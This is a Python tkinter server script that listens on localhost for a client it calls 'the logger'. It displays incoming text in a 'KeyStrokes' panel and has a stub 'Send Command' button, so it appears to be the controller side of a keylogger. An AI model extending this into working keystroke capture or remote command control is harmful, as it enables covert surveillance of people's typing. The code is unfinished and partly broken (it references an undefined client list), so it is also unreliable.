
import socket
import threading
import tkinter as tk


def handle_sending():
    print("button pressed")


class Server:
    connected_logger = None
    root = tk.Tk()
    root.title("Text Area Example")
    root.geometry("500x500")
    # Create the text area widget
    panel_frame = tk.Frame(root)
    panel_frame.pack()

    headline1_label = tk.Label(panel_frame, text="KeyStrokes")
    headline1_label.grid(row=0, column=0, padx=5, pady=5)

    headline2_label = tk.Label(panel_frame, text="Commends")
    headline2_label.grid(row=0, column=1, padx=5, pady=5)

    # Textbox 1
    text_area = tk.Text(panel_frame, height=10, width=30)
    text_area.grid(row=1, column=0, padx=5, pady=5)

    # Textbox 2
    text2 = tk.Text(panel_frame, height=10, width=30)
    text2.grid(row=1, column=1, padx=5, pady=5)

    def client_connected(self):
            pass

    button = tk.Button(root, text="Send Command", command=handle_sending)
    button.pack(pady=5)
    last_received_message = ""

    def __init__(self):
        self.stop = False
        self.server_socket = None
        self.worker_thread = threading.Thread(target=self.create_listening_server)
        self.worker_thread.start()
        print("Server thread started")
        self.root.mainloop()

    def on_closing(self):
        self.stop = True
        self.worker_thread.join()
        print("Server thread stopped")
        # Ensure the socket is closed even if the thread is stopped abruptly
        self.server_socket.close()

    # listen for incoming connection
    def create_listening_server(self):

        self.server_socket = socket.socket(socket.AF_INET,
                                           socket.SOCK_STREAM)  # create a socket using TCP port and ipv4
        local_ip = "127.0.0.1"
        local_port = 10319
        # this will allow you to immediately restart a TCP server
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # this makes the server listen to requests coming from other computers on the network
        self.server_socket.bind((local_ip, local_port))
        print("Listening for incoming messages..")
        self.server_socket.listen(1)  # listen for incoming connections / max 1 client - the logger
        self.receive_messages_in_a_new_thread()

    # fun to receive new msgs
    def receive_messages(self, so):
        while not self.stop:
            incoming_buffer = so.recv(256)  # initialize the buffer
            if not incoming_buffer:
                break
            self.last_received_message = incoming_buffer.decode('utf-8')
            self.text_area.insert(tk.END, self.last_received_message)
            #self.broadcast_to_all_clients(so)  # send to all clients
        so.close()

    # broadcast the message to all clients
    def broadcast_to_all_clients(self, senders_socket):  # send output to logger
        for client in self.clients_list:
            socket, (ip, port) = client
            if socket is not senders_socket:
                socket.sendall(self.last_received_message.encode('utf-8'))

    def receive_messages_in_a_new_thread(self):
        while not self.stop:
            client = so, (ip, port) = self.server_socket.accept()
            self.connected_logger = client
            self.client_connected()
            print('Connected to ', ip, ':', str(port))
            t = threading.Thread(target=self.receive_messages, args=(so,))
            t.start()

    # add a new client


if __name__ == "__main__":
    Server()
    # Run the main loop
